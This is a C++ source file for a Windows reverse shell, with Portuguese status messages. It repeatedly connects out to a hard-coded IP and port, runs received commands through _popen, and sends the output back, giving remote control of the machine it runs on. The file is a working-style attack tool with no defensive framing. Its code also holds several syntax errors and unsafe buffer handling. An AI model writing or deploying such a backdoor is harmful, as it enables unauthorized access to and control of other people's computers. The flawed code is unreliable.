#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <cstdlib>
#include <cstring>
#include <string>
#include <vector>
#include <stdexcept>
#include <unistd.h>
#include <sys/types.h>

using std::exception;
using std::cout;
using std::cin;
using std::string;
using std::vector;
using std::endl;

void cmd_cntrl(SOCKET & sockfd);

int main(){
	// init variables needed for the connection;
	WSADATA wsa;
	WSAStartup(MAKEWORD(2,2), &WSA);
	SOCKET sockfd = socket(PF_INET, SOCK_STREAM, 0);
	int connect_status = 0;
	//
	const char host[] = "192.168.1.30";
	u_short port = 5555;
	// Init socket struct
	struct sockaddr_in taddr;
	taddr.sin_port = htons(port);
	taddr.sin_family = AF_INET;
	taddr.sin_addr.s_addr = inet_addr(host);
	memset(&taddr.sin_zero, '\0', sizeof(taddr.sin_zero));
	socklen_t sin_size = sizeof(taddr);



	while(true){
		try{
			sleep(1);
			cout << "[*] Tentando conexao." << endl;
			connect_status = connect(sockfd,(struct sockaddr *)&taddr, sin_size);
			if(connect_status == -1)
				throw 99;
			else{
				cout << "[+] Conectado!" << endl;
				break;
			}
		
		}catch(int e){
			cout << "[-] Falha na conexao\n[*] Tentando novamente em 10 segundos..." << endl;
			sleep(10);
		
		}
	
	
	}
	cmd_cntrl(sockfd);



}


void cmd_cntrl(SOCKET& sockfd){
	const int bfl = 128;
	char rcv[128];
       	int rcv_status = 0;
	char error[] = "[-] Client-Side Error.";
	int size_error = strlen(error);
	char pwd[64];
	FILE * fp;
	char cmd[128];
	char cmd_send[4096];

	while(true){
		rcv_status = recv(sockfd, rcv, 128, 0);
		if(rcv_status == -1)
			send(sockfd, error, size_error, 0);
		else{
			if((strncmp(rcv, "exit", 4)) == 0){
				main();
			
			}
			else{
				if((strncmp(rcv, "pwd", 3)) == 0){
					_getcwd(pwd, 64);
					strcat(pwd, "> ");
					send(sockfd, pwd, strlen(pwd), 0);
					continue;
				}
				else{
					char dest_dir[64];

					if((strncmp(rcv, "cd" 2)) == 0){
						for(int i=3;j = 0; rcv[i] != '\0'; i++, j++){
							dest_dir[j] = rcv[i];
						}
						_chdir(dest_dir);
						memset(pwd, '\0', strlen(pwd));
						_getcwd(pwd, 64);
						strcat(pwd, "> ");
						send(sockfd, pwd, strlen(pwd), 0);
					
					
					}

					else{
					fp = _popen(rcv, "rb");
						if(fp){
							while(!feof(fp)){
								if((fgets(cmd, 128, fp)) != NULL){
									strcat(cmd_send, cmd);
							
								}
						
							}
							if(strlen(cmd_send)){
								send(sockfd, cmd_send, strlen(cmd_send), 0);
								continue;
							}
							else{
								send(sockfd, error, strlen(error), 0);
								continue;
							}
						}
					}
				}
			
			}
		
		}
	

	
	memset(pwd, '\0', sizeof(pwd));
	memset(rcv, '\0', strlen(rcv));

	}	

}
